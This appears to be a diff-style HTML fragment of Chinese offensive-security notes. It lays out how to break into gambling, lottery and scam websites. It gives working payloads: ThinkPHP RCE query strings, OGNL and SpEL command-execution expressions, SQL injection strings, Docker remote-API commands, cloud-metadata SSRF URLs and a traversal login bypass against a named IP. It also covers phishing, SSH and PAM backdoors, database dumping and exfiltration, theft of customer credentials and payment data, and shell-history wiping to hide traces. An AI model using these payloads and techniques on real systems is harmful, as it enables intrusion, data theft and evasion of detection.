+<li>渗透</li>
+<li>判断版本</li>
+<li>本地搭建</li>
+<li>工具<ul>
+<li>漏洞</li>
+<li>漏洞需要权限</li>
+<li>漏洞原理</li>
+<li>抓包</li>
+<li>自己改</li>
+</ul>
+</li>
+<li>信息收集</li>
+<li>漏洞积累</li>
+<li>​<a href="https://ot8oa9a41m.feishu.cn/docx/IfLOdfra7oxJrHxHB6qc7Dx8nux">漏洞积累</a>​</li>
+</ul>
+</li>
+<li>活动站<ul>
+<li>注入</li>
+<li>sqlmap改<ul>
+<li>指定了数据库、指定了表</li>
+<li>去掉所有的探测内容</li>
+</ul>
+</li>
+<li>备份文件</li>
+<li>框架漏洞</li>
+<li>rce/反序列化漏洞</li>
+<li>上传</li>
+<li>任意文件读/写</li>
+<li>github\google</li>
+<li><a href="https://xvi.vulbox.com/">https://xvi.vulbox.com/</a></li>
+<li>临时搭建</li>
+<li>打下后需翻文件横向移动<ul>
+<li>mq</li>
+<li>钓鱼</li>
+</ul>
+</li>
+<li>之前</li>
+<li>打包卖的<ul>
+<li>易搜索</li>
+<li>跟实际站点一起</li>
+</ul>
+</li>
+<li>很少</li>
+<li>收集域名资产进一步扩展</li>
+<li>多个包网分站公用一个活动站</li>
+<li>使用包网相关域名</li>
+</ul>
+</li>
+<li>客服站<ul>
+<li>xss</li>
+<li>钓鱼</li>
+<li>electron rce</li>
+<li>买的源码自己搭的</li>
+<li>markdown<ul>
+<li>标签</li>
+</ul>
+</li>
+<li>找客服系统供应商套路测试站、源码</li>
+<li>找后台</li>
+<li>扫目录</li>
+<li>通过客服站资产归因包网资产</li>
+<li>94chat</li>
+<li>套路客服获取站点更多信息</li>
+<li>拿下客服站并不能拿下核心数据</li>
+</ul>
+</li>
+<li>页面特征找关联站<ul>
+<li>js</li>
+<li>js console</li>
+<li>静态资源加载</li>
+<li>wss</li>
+<li>不靠谱</li>
+</ul>
+</li>
+<li>干包网<ul>
+<li>运维服务</li>
+<li>Jenkins</li>
+<li>各类国产oa管理软件</li>
+<li>mq</li>
+<li>测试站</li>
+<li>弱口令</li>
+<li>getshell<ul>
+<li>横向</li>
+<li>挂马钓鱼</li>
+<li>yun<ul>
+<li>客户机</li>
+</ul>
+</li>
+<li>拿源码</li>
+<li>报错调试</li>
+</ul>
+</li>
+<li>收集后台接口<ul>
+<li>../../../</li>
+</ul>
+</li>
+<li>源码二道贩子<ul>
+<li>简单聊一下</li>
+<li>扫备份</li>
+<li>黑盒</li>
+<li>根据后台页面加载资源找更多的页面特征</li>
+<li>money.php</li>
+<li>后台调试报错<ul>
+<li>特殊的数据库表名、文件名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>历史边缘资产</li>
+<li>包网很难找</li>
+<li>bbscan找备份快速代码审计</li>
+<li>备份只适用于本站<ul>
+<li>后台api，后端文件名</li>
+</ul>
+</li>
+<li>越权有意义吗？</li>
+<li>后台多个管理账号情况下</li>
+<li>垂直越权<ul>
+<li>更多接口权限</li>
+</ul>
+</li>
+<li>水平越权<ul>
+<li>全站</li>
+</ul>
+</li>
+<li>信息收集、黑盒、白盒、内网<ul>
+<li>攻击对</li>
+<li>分工明确</li>
+<li>企业雇员</li>
+<li>独立完成一个目标从头到尾</li>
+<li>CaA</li>
+<li>burp、yakit</li>
+<li>cpacha_killer_modify</li>
+<li>burp无法抓包，指纹被识别，改tls</li>
+<li>选基础的</li>
+<li>poc验证<ul>
+<li>扫描器开发</li>
+<li>尽量不要带攻击特征</li>
+<li>发包内容无害化</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>目标是什么<ul>
+<li>打下包网</li>
+<li>控制所有数据</li>
+<li>维权</li>
+<li>供应链<ul>
+<li>客户账密支付信息</li>
+</ul>
+</li>
+<li>控制台子权限</li>
+<li>获取源码</li>
+<li>控运维、开发，最差控客服</li>
+<li>是否需要往下控客户<ul>
+<li>f2a验证</li>
+<li>绑https</li>
+<li>google验证码</li>
+<li>手机绑定</li>
+<li>微软auth</li>
+<li>ip白名单</li>
+<li>xff头</li>
+<li>有漏洞改配置</li>
+<li>登录ip</li>
+<li>chrome remote debug</li>
+<li>cookie/storage</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>四方支付/外接台子 ---换目标了<ul>
+<li>login proxy</li>
+<li>用户名变化</li>
+<li>加载资产变换</li>
+<li>新的域名特征无法关联回源站</li>
+<li>找框架</li>
+<li>找资产</li>
+<li>找漏洞</li>
+</ul>
+</li>
+<li>大的更大，小的更小<ul>
+<li>买bc拍照</li>
+<li>正式化、公司化、规模化<ul>
+<li>azure</li>
+<li>云应用</li>
+<li>难度大、时间成本高</li>
+<li>长期坐牢、打击积极性</li>
+</ul>
+</li>
+<li>原来的盘子被打了</li>
+<li>卖源码<ul>
+<li>老旧</li>
+<li>前端不靠谱<ul>
+<li>后台代码被改了</li>
+<li>uniapp前端<ul>
+<li>雇私人开发</li>
+<li>后端|api|文件名xxx.php</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>代码不完整</li>
+<li>脱下来的代码<ul>
+<li>没有完全解密</li>
+</ul>
+</li>
+<li>逻辑有问题</li>
+<li>采集器<ul>
+<li>正规采集数据</li>
+<li>加自己能控制的彩种、局数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>信用盘|娱乐城<ul>
+<li>主要目标</li>
+</ul>
+</li>
+<li>QB<ul>
+<li>试用期6个月</li>
+<li>打穿并长期驻留</li>
+</ul>
+</li>
+<li>区块链<ul>
+<li>web3</li>
+<li>杀猪盘</li>
+<li>btc赌局</li>
+</ul>
+</li>
+<li>tg bot</li>
+<li>原来老板不干了<ul>
+<li>手底下人转卖</li>
+<li>原来没什么漏洞</li>
+<li>源码会不会有后门</li>
+</ul>
+</li>
+<li>微盘<ul>
+<li>精聊</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>cp</li>
+<li>注入<ul>
+<li>投注环节sql注入</li>
+<li>接外部彩票接口，本体站点自行搭建</li>
+<li>前后端加密</li>
+<li>签到注入</li>
+<li>轮盘活动</li>
+<li>orderby=rand(1=1)</li>
+</ul>
+</li>
+<li>客服站<ul>
+<li>邀请码</li>
+<li>53</li>
+<li>meiqia</li>
+</ul>
+</li>
+<li>导航站</li>
+<li>聊天室<ul>
+<li>xss</li>
+<li>ws</li>
+<li>找包网</li>
+</ul>
+</li>
+<li>图片站<ul>
+<li>找包网</li>
+<li><a href="http://img.xxx.com">img.xxx.com</a></li>
+<li>管理系统</li>
+</ul>
+</li>
+<li>编辑器<ul>
+<li>任意文件上传</li>
+<li>xss</li>
+<li>ueiditor</li>
+<li>php<ul>
+<li>ssrf</li>
+<li>内网存活端口</li>
+<li>真实ip<ul>
+<li>dns</li>
+<li>176.xxxx</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>dotnet<ul>
+<li>上传</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>积分系统<ul>
+<li>废弃了</li>
+</ul>
+</li>
+<li>演示站<ul>
+<li>打源码</li>
+</ul>
+</li>
+<li>报错信息<ul>
+<li>json闭合</li>
+<li>变量名数组</li>
+<li>word[]=xxx<ul>
+<li>java\php\中间件</li>
+<li>cf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>多端口<ul>
+<li>高端口开其他服务</li>
+<li>真实ip</li>
+<li>绑定不同域名</li>
+<li>ngnix反带</li>
+<li>80-30000+</li>
+</ul>
+</li>
+<li>搭建宝塔/护卫神<ul>
+<li>靶场练习</li>
+<li>注入</li>
+<li>上传</li>
+<li>改密码</li>
+<li>关服务</li>
+</ul>
+</li>
+<li>脱裤<ul>
+<li>adminer</li>
+<li>拖到服务器上分片传输</li>
+<li>web目录</li>
+<li>github lfs<ul>
+<li>action</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>反序列化<ul>
+<li>CI</li>
+<li><a href="https://guokeya.github.io/post/lQXYmp8_4/">https://guokeya.github.io/post/lQXYmp8_4/</a></li>
+<li>gzip test.phar</li>
+</ul>
+</li>
+<li>国内主流域名<ul>
+<li>常见src</li>
+<li>bc站、zp站</li>
+<li>通过特征批量收集到</li>
+<li>爬虫</li>
+<li>做字典</li>
+</ul>
+</li>
+<li>zp</li>
+<li>本站快速打点<ul>
+<li>目录</li>
+<li>端口</li>
+<li>弱口令</li>
+<li>bbscan找备份快速代码审计</li>
+<li>头像上传</li>
+<li>语音朋友圈上传</li>
+<li>钓鱼<ul>
+<li>SH</li>
+</ul>
+</li>
+<li>裸聊、同城免费</li>
+<li>做任务刷单</li>
+</ul>
+</li>
+<li>n个网站<ul>
+<li>1-2月</li>
+</ul>
+</li>
+<li>半年-1年</li>
+<li>php<ul>
+<li>变量覆盖</li>
+</ul>
+</li>
+<li>路由<ul>
+<li>filter、waf、</li>
+<li>提出来扫一遍</li>
+</ul>
+</li>
+<li>漏洞点<ul>
+<li>配置文件</li>
+<li>硬编码<ul>
+<li>cookie伪造</li>
+</ul>
+</li>
+<li>危险函数</li>
+<li>debug<ul>
+<li>黑百合</li>
+</ul>
+</li>
+<li>怎么触发需要什么条件</li>
+<li>路由</li>
+<li>权限</li>
+</ul>
+</li>
+<li>临时买服务器<ul>
+<li>ram</li>
+<li>必须绑mfa<ul>
+<li><a href="https://auth.ping8.top/">https://auth.ping8.top/</a></li>
+<li>导出用户名：secret</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="_33">常见漏洞原理及利用工具与思路</h4>
+<ul>
+<li>漏洞利用思路</li>
+<li>组件<ul>
+<li>源码</li>
+<li>开源</li>
+<li>备份</li>
+<li>套路客服测试站</li>
+<li>网盘泄露</li>
+<li>测试多个版本</li>
+<li>商业版需破解<ul>
+<li>加解密</li>
+</ul>
+</li>
+<li>php漏洞</li>
+<li>23、24<ul>
+<li>cgi-bin</li>
+<li>XAMPP</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>版本<ul>
+<li>更新时间</li>
+<li>修复日志</li>
+<li>修复方式？绕过</li>
+<li>影响范围</li>
+<li>商业版与开源版差异</li>
+<li>hw</li>
+</ul>
+</li>
+<li>poc获取<ul>
+<li>github</li>
+<li>博客</li>
+<li>源码自行分析</li>
+<li>没出exp<ul>
+<li>根据补丁自行分析</li>
+</ul>
+</li>
+<li>工具抓包提取</li>
+</ul>
+</li>
+<li>原理<ul>
+<li>漏洞点</li>
+<li>利用条件</li>
+<li>产生不良后果</li>
+<li>请求路由</li>
+<li>二次开发</li>
+</ul>
+</li>
+<li>实战化改造<ul>
+<li>本地环境搭建</li>
+<li>不出网</li>
+<li>.net core</li>
+<li>内存马</li>
+</ul>
+</li>
+<li>常用漏洞</li>
+<li>sql注入<ul>
+<li>不要用sqlmap</li>
+<li>自己写脚本</li>
+<li>是否站库分离</li>
+<li>是否有写权限</li>
+<li>是否可以执行命令</li>
+<li>oracle<ul>
+<li>19c</li>
+<li>sys</li>
+</ul>
+</li>
+<li>不可破解就写入后台账密or配置参数（文件类型）or改写秘钥</li>
+<li>Bcrypt</li>
+<li>上传文件类型</li>
+<li><a href="https://github.com/r0oth3x49/ghauri">https://github.com/r0oth3x49/ghauri</a></li>
+</ul>
+</li>
+<li>任意文件读取<ul>
+<li>读敏感文件</li>
+<li>能否列目录</li>
+<li>windows能否跨盘符</li>
+<li>.bash_history</li>
+<li>.viminfo</li>
+<li>源码、配置文件、日志、启动脚本</li>
+<li>/proc/net/</li>
+<li>/proc/self/</li>
+<li>/proc/pid/</li>
+</ul>
+</li>
+<li>任意文件上传<ul>
+<li>目录</li>
+<li>是否返回目录</li>
+<li>/var/www/<a href="http://www.xxx.com/img/xxx.php">www.xxx.com/img/xxx.php</a><ul>
+<li><a href="http://www.xxx.com/limg/xxx.php">www.xxx.com/limg/xxx.php</a></li>
+</ul>
+</li>
+<li>上传oss</li>
+<li>上传本地|跨盘符</li>
+<li>配合任意文件包含</li>
+</ul>
+</li>
+<li>docker<ul>
+<li>判断环境</li>
+<li>.dockerenv |ls -alh /.dockerenv|cat /proc/1/cgroup|mount | grep "docker"|fdisk -l|ps -aux</li>
+<li>cat /proc/self/status | grep Cap</li>
+<li>特权模式将宿主机挂载</li>
+<li>0000003fffffffff</li>
+<li>Registry API 未授权访问漏洞利用</li>
+<li><a href="https://github.com/Soufaker/docker_v2_catalog">https://github.com/Soufaker/docker_v2_catalog</a></li>
+<li>remote api未授权</li>
+<li>2375<ul>
+<li>docker -H tcp://<target>:2375 ps -a</li>
+</ul>
+</li>
+<li><a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></li>
+<li><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></li>
+</ul>
+</li>
+<li>ssrf<ul>
+<li><a href="http://100.100.100.200/latest/meta-data">http://100.100.100.200/latest/meta-data</a></li>
+<li><a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role">http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role</a></li>
+<li><a href="http://metadata.tencentyun.com/latest/meta-data/">http://metadata.tencentyun.com/latest/meta-data/</a></li>
+<li>oss brower、cf</li>
+<li><a href="https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html">https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html</a></li>
+</ul>
+</li>
+<li>php配置文件写入<ul>
+<li>'); phpinfo(); /*</li>
+<li>变量覆盖</li>
+</ul>
+</li>
+<li>只给一个登录口怎么玩<ul>
+<li>面试经典问题</li>
+<li>考发散思维</li>
+<li>ip</li>
+<li>域名</li>
+<li>谷歌搜索提及网站的历史文章</li>
+<li>wayurl</li>
+<li>js\目录\接口\参数爆破（arjun、hae）</li>
+<li>注入</li>
+<li>.net</li>
+<li>注册</li>
+<li>github找登录脚本</li>
+<li>爆破jwt</li>
+<li>help文档</li>
+<li><a href="https://github.com/cws001/swagger-exp-knife4j">https://github.com/cws001/swagger-exp-knife4j</a></li>
+</ul>
+</li>
+<li>TP<ul>
+<li>工具</li>
+<li><a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></li>
+<li>日志</li>
+<li>debug</li>
+<li>rce</li>
+<li>高版本</li>
+<li>多语言</li>
+<li>docker</li>
+<li>注入</li>
+<li>3.2.3、3.2.5</li>
+</ul>
+</li>
+<li>tg信息收集<ul>
+<li>钓鱼页面</li>
+<li>linkedin<ul>
+<li>邮箱</li>
+<li>电话</li>
+</ul>
+</li>
+<li>evilginx</li>
+</ul>
+</li>
+<li>收集包网信息<ul>
+<li>菲律宾、台湾</li>
+</ul>
+</li>
+<li>ssh后门</li>
+<li>tsh<ul>
+<li>内网机器</li>
+<li>产生外网连接</li>
+<li>vps机器不能掉</li>
+</ul>
+</li>
+<li>PAM<ul>
+<li>测试好版本</li>
+<li>保持好连接不能掉</li>
+</ul>
+</li>
+<li><a href="https://github.com/9bie/sshdHooker">https://github.com/9bie/sshdHooker</a></li>
+<li>找文件</li>
+<li><a href="https://github.com/AabyssZG/FindEverything">https://github.com/AabyssZG/FindEverything</a><ul>
+<li>扩写自己喜欢的版本</li>
+</ul>
+</li>
+<li>痕迹清除</li>
+<li>windows<ul>
+<li><a href="https://github.com/r00tSe7en/ShadowlessFeet">https://github.com/r00tSe7en/ShadowlessFeet</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="_34">痕迹清理</h4>
+<ul>
+<li>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</li>
+<li>修改文件时间</li>
+<li>内网探测逻辑</li>
+<li>内网严禁扫描</li>
+<li>按照机器逻辑访问内网</li>
+<li>根据内网连接探测内网</li>
+<li>脚本作业</li>
+<li>单线程</li>
+<li>扫单个端口</li>
+<li>ip地址随机</li>
+<li>扫描后有随机时延</li>
+</ul>
+<h2 id="_35">**代码审计 **</h2>
+<h3 id="java">实战 java 代码审计</h3>
+<h4 id="bc-getshell">BC 站源码审计 getshell 实战</h4>
+<ul>
+<li>pom</li>
+<li>sql注入<ul>
+<li>mybatis</li>
+<li>类型严格</li>
+<li>order by ${time}</li>
+<li>LIKE '%${stuName}%'</li>
+<li>in (${id})</li>
+<li>直接调用语句</li>
+<li>OGNL注入<ul>
+<li><select id="getUserByUserName" parameterType="String" resultMap="User">    select * from users where username like ${username}&lt;/select</li>
+<li>OgnlCache.getValue</li>
+<li><strong>parseExpression</strong><ul>
+<li>${@java.lang.Runtime@getRuntime().exec("whoami")}</li>
+<li>${@java.lang.Thread@currentThread().sleep(9000L)}</li>
+</ul>
+</li>
+<li><a href="https://commons.apache.org/dormant/commons-ognl/language-guide.html">https://commons.apache.org/dormant/commons-ognl/language-guide.html</a></li>
+<li><a href="https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md">https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>反序列化<ul>
+<li>fastjson</li>
+<li>不能打也确定有cc链</li>
+<li>shiro</li>
+<li>log4j</li>
+<li>根据依赖和版本确定能打哪条链子</li>
+<li>所谓的工具熟悉</li>
+<li>知道漏洞原理</li>
+<li>有poc</li>
+<li>能改poc(链子)</li>
+<li>JasperReports</li>
+</ul>
+</li>
+<li>SSTI模板注入<ul>
+<li>thymeleaf</li>
+<li><a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a><ul>
+<li>$</li>
+<li>*</li>
+<li>~</li>
+</ul>
+</li>
+<li>SPEL表达式执行<ul>
+<li><a href="https://itmyhome.com/spring/expressions.html">https://itmyhome.com/spring/expressions.html</a></li>
+<li>前提条件</li>
+<li>传入的表达式无过滤</li>
+<li>表达式解析之后调用了getValue/setValue方法</li>
+<li>使用StandardEvaluationContext（默认）作为上下文对象</li>
+</ul>
+</li>
+<li><strong>$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d</strong>::.x<ul>
+<li>templateName</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>组件弱口令/未授权<ul>
+<li>durid</li>
+<li>未授权</li>
+<li>rce</li>
+<li>swagger-ui</li>
+<li>xxl-job</li>
+</ul>
+</li>
+<li>组件版本</li>
+<li>功能模块</li>
+<li>filter</li>
+<li>缺陷导致目录穿越<ul>
+<li>越权</li>
+</ul>
+</li>
+<li>xss</li>
+<li>路由</li>
+<li>黑百盒结合跑未授权接口<ul>
+<li>简单分析状态码</li>
+</ul>
+</li>
+<li>LICENSE</li>
+<li>看框架</li>
+<li>功能模块梳理</li>
+<li>登录功能</li>
+<li>绕过登录<ul>
+<li>GET /api/admin/login/../../../api/userBill/export  HTTP/1.1Host: 3.1.181.69:8080Accept: application/json, text/plain, <em>/</em>x-api-idempotent: bfe3cd31-cf0c-4ac5-a1ba-f9886f5b556dAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Referer: <a href="http://3.1.181.69:8080/Accept-Encoding:">http://3.1.181.69:8080/Accept-Encoding:</a> gzip, deflate, brConnection: keep-alive</li>
+</ul>
+</li>
+<li>secret硬编码<ul>
+<li>查看token、cookie生成方法</li>
+<li>伪造token、cookie</li>
+</ul>
+</li>
+<li>伪随机(语言不同，思路一致)<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html">https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html</a></li>
+<li>django-simple-captcha<ul>
+<li>seed相同时，两次获取随机数是完全一样的</li>
+<li>random.seed()设置种子会作用于整个进程 也就是说，我们通过获取验证码的请求来设置随机数种子，那如果后续找回密码的请求也经过我们这个进程，就会使用我们设置的种子来产生随机数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>未授权、可控制权限接口功能</li>
+<li>上传</li>
+<li>注入<ul>
+<li><a href="https://www.yangdx.com/2022/05/211.html">https://www.yangdx.com/2022/05/211.html</a></li>
+</ul>
+</li>
+<li>xxe<ul>
+<li>能rce?</li>
+<li>file ftp mailto http https jar netdoc</li>
+</ul>
+</li>
+<li>文件操作</li>
+<li>ssrf</li>
+<li>粗糙waf语句</li>
+<li>通常在filter<ul>
+<li>规则不严绕waf</li>
+<li>找没有在filter规则内的接口</li>
+</ul>
+</li>
+<li><a href="https://blog.csdn.net/sdnuwjw/article/details/103536816">https://blog.csdn.net/sdnuwjw/article/details/103536816</a></li>
+</ul>
+<h4 id="cp-getshell">cp 站源码审计 getshell 实战</h4>
+<ul>
+<li>在线反编译</li>
+<li><a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a></li>
+<li><a href="http://www.decompiler.com/">http://www.decompiler.com/</a></li>
+<li><a href="https://devtoolzone.com/decompiler/java">https://devtoolzone.com/decompiler/java</a></li>
+<li><a href="https://jdec.herokuapp.com/">https://jdec.herokuapp.com/</a></li>
+<li><a href="https://www.mobilefish.com/services/java_decompiler/java_decompiler.php">https://www.mobilefish.com/services/java_decompiler/java_decompiler.php</a></li>
+<li><a href="http://javare.cn/">http://javare.cn/</a></li>
+<li>快速找关键字</li>
+<li><a href="https://github.com/Ppsoft1991/CodeReviewTools">https://github.com/Ppsoft1991/CodeReviewTools</a></li>
+<li><a href="https://github.com/4ra1n/code-inspector">https://github.com/4ra1n/code-inspector</a></li>
+<li><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></li>
+<li><a href="https://github.com/ax1sX/RouteCheck-Alpha">https://github.com/ax1sX/RouteCheck-Alpha</a></li>
+<li>实战案例（已删除）</li>
+<li>确认存在漏洞后根据路由及页面特征找存活站</li>
+<li><a href="https://github.com/blackorbird/APT_REPORT">https://github.com/blackorbird/APT_REPORT</a></li>
+<li><a href="https://github.com/timwhitez/Doge-DNSptr">https://github.com/timwhitez/Doge-DNSptr</a></li>
+<li><a href="https://github.com/bit4woo/knife">https://github.com/bit4woo/knife</a></li>
+</ul>
+<h4 id="java_1">java反序列化</h4>
+<ul>
+<li>classloader</li>
+<li>BootStrap ClassLoader(-Xbootclasspath)<ul>
+<li>rt.jar</li>
+<li>java.lang, <a href="http://java.io/">java.io</a></li>
+<li>resources.jar</li>
+<li>charsets.jar</li>
+</ul>
+</li>
+<li>Ext ClassLoader(-D java.ext.dirs)</li>
+<li>App ClassLoader(-classpath)</li>
+<li>AppClassLoader的父亲(不是父类)是ExtClassLoader<ul>
+<li>AppClassLoader 的类: class jdk.internal.loader.ClassLoaders$AppClassLoader</li>
+<li>ExtClassLoader 的类: class jdk.internal.loader.ClassLoaders$PlatformClassLoader  // JDK 8+ 中为 PlatformClassLoader</li>
+<li>AppClassLoader 的父类: class jdk.internal.loader.URLClassLoader</li>
+<li>ExtClassLoader 的父类: class jdk.internal.loader.URLClassLoader</li>
+</ul>
+</li>
+<li>AppClassLoader, ExtClassLoader都是属于sun.misc.Launcher类中的一个成员类</li>
+<li>顶级父类加载 -&gt; 父类加载 -&gt; 加载不到再本地加载<ul>
+<li>本类加载 -&gt; 加载不到再父类加载</li>
+<li>自定义 ClassLoader<ul>
+<li>loadClass（加载指定的Java类）如果自定义 ClassLoader 重写 loadClass 方法, 那么将打破双亲委派机制! 因为双亲委派机制是在 loadClass 方法上产生的.</li>
+<li>findClass（查找指定的Java类）</li>
+<li>findLoadedClass（查找JVM已经加载过的类）</li>
+<li>defineClass（定义一个Java类）如果调用到任意 ClassLoader 的 defineClass 方法, 并传入相应的字节码, 那么 JVM 便加载该类 (如果该类继承 | 实现了某个类 | 接口, 那么会先加载父类 | 接口). 唯一一点是自定义ClassLoader加载某个类时, 类包名不允许以java.打头, 否则会抛出异常.</li>
+<li>resolveClass（链接指定的Java类）</li>
+<li>webshell定义了equals方法, 调用fillContext函数将马子中传递过来的pageContext传入过来了, 随后通过pageContext得到WEB中request, response, session对象</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>BCEL ClassLoader<ul>
+<li>com.sun.org.apache.bcel</li>
+<li>包含在jdk中<ul>
+<li>JDK &lt; 8u251</li>
+<li>rt.jar</li>
+</ul>
+</li>
+<li>tomcat7: <a href="http://org.apache.tomcat.dbcp.dbcp.basicdatasource/">org.apache.tomcat.dbcp.dbcp.BasicDataSource</a></li>
+<li>tomcat8 及其以后: <a href="http://org.apache.tomcat.dbcp.dbcp2.basicdatasource/">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</a></li>
+<li>在loadClass()方法中，createClass()通过subString()截取$$BCEL$$后的字符串，并调用Utility.decode进行相应的解码并最终返回改字节码的bytes数组。之后生成Parser解析器并调用parse()方法进行解析，生成JavaClass对象。之后获取到了该JavaClass对象的bytes数组并调用java原生的defineClass()加载，从而实现类加载。</li>
+</ul>
+</li>
+<li>命令执行</li>
+<li>直接或间接调用newTransformer或getOutputProperties方法，最终进入defineTransletClasses方法，将_bytecodes字段中存储的类的bytecode重新在JVM中定义为类，最终在对其调用newInstance方法时，触发写在该类static块或者无参构造方法中的代码块</li>
+<li>cc</li>
+<li>c3p0</li>
+<li>0XACED005</li>
+</ul>
+<h3 id="php">实战 php 代码审计</h3>
+<h4 id="bc-getshell_1">BC 站源码审计 getshell 实战</h4>
+<ul>
+<li>安装</li>
+<li>composer</li>
+<li>git</li>
+<li>手拖安装包</li>
+<li>docker</li>
+<li>tp3/5区别</li>
+<li>3<ul>
+<li>目录开头大写</li>
+</ul>
+</li>
+<li>5/6<ul>
+<li>目录开头小写</li>
+</ul>
+</li>
+<li>log日志存放位置不同</li>
+<li>架构</li>
+<li>runtime<ul>
+<li>网页缓存</li>
+<li>Cache::set</li>
+<li>session</li>
+<li>log-&gt;session id</li>
+</ul>
+</li>
+<li>application/6-app<ul>
+<li>存放项目源码</li>
+</ul>
+</li>
+<li>thinkphp<ul>
+<li>框架源码</li>
+<li>6-/vendor/topthink/framework/src/think</li>
+</ul>
+</li>
+<li>vender<ul>
+<li>composer安装的扩展库</li>
+</ul>
+</li>
+<li>extend<ul>
+<li>手动安置的第三方库or自己封装的库</li>
+</ul>
+</li>
+<li>路由模式</li>
+<li>tp3<ul>
+<li>
+<h1 id="tp32-thinkphpconfconventionphp-return-array-url_model-1-url-0-1-pathinfo-2-rewrite-3-url_router_on-false-url_route_rules-array">tp3.2.* /ThinkPHP/Conf/convention.php return array( 'URL_MODEL'              =&gt; 1, //URL模式： 0 (普通模式)；1 (PATHINFO 模式) 默认；2 (REWRITE  模式)；3 (兼容模式) // 静态路由： 'URL_ROUTER_ON' = false, 'URL_ROUTE_RULES' = array(), )</h1>
+</li>
+</ul>
+</li>
+<li>tp5</li>
+<li>tp6<ul>
+<li>无需配置可基于pathinfo和兼容模式访问。只支持路由配置，自设动态路由和静态路由规则，通过Route类设定。开启强制路由的话，所有访问必须通过路由规则才能访问成功。配置路径为/config/route.php</li>
+<li>Route::get</li>
+<li>Route::rule</li>
+<li>Route::xxx</li>
+</ul>
+</li>
+<li>sql注入</li>
+<li>count和max方法未过滤调用parseKey<ul>
+<li>5.0.0/5.0.23/tp3</li>
+</ul>
+</li>
+<li>ThinkPHP/Library/Think/Model.class.php::_parseOptions直接拼接PDO参数$option</li>
+<li>ThinkPHP\Library\Think\Db\Driver.class.php的parseWhereItem直接拼接处理where查询表达式<ul>
+<li>bind表达式：ThinkPHP &lt;= 3.2.4</li>
+<li>between表达式：ThinkPHP 3.1.*-3.2.0</li>
+<li>eq/neq/gt表达式：ThinkPHP 3.2.*</li>
+<li>id[]=bind&amp;id[]=1%27&amp;tel[]=112312616&amp;email=admin@emal.com</li>
+</ul>
+</li>
+<li>thinkphp/library/think/db/Builder.php的parseData方法未过滤调用parseKey<ul>
+<li>5.0.13&lt;=ThinkPHP&lt;=5.0.15（inc/dec），5.1.0&lt;=ThinkPHP&lt;=5.1.5（exp/inc/dec）</li>
+<li>username[0]=exp&amp;username[1]=updatexml(1,concat(1,user(),1),1)&amp;username[2]=2</li>
+</ul>
+</li>
+<li>投注<ul>
+<li>新闻已浏览</li>
+<li>签到|活动<ul>
+<li>大转盘</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>rce</li>
+<li>Request::__construct变量覆盖+Request::input代码执行<ul>
+<li>ThinkPHP [5.0.0, 5.0.23]</li>
+<li>利用条件</li>
+<li>trace+强制路由（url_route_on和url_route_must开启）<ul>
+<li>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</li>
+</ul>
+</li>
+<li>debug+url_route_on路由开启（默认）<ul>
+<li>_method=__construct&amp;filter[]=system&amp;get[]=id</li>
+</ul>
+</li>
+<li>$dispatch['method']+url_route_on路由开启（默认）<ul>
+<li>?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=id</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>$dispatch['module']混合模式下未过滤控制器App::invokemethod反射可调用任意类导致代码执行<ul>
+<li>ThinkPHP [5.0.0, 5.0.23], ThinkPHP [5.1.0, 5.1.30]</li>
+<li>默认开启url_route_on配置（混合模式）</li>
+<li>/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</li>
+</ul>
+</li>
+<li>think\process\pipes\Windows:__destruct 任意文件删除</li>
+<li>LoadLangPack.php::switchLangSet() 多语言模式包含<ul>
+<li>版本范围：ThinkPHP v6.0.1-v6.0.13，v5.0.x，v5.1.x</li>
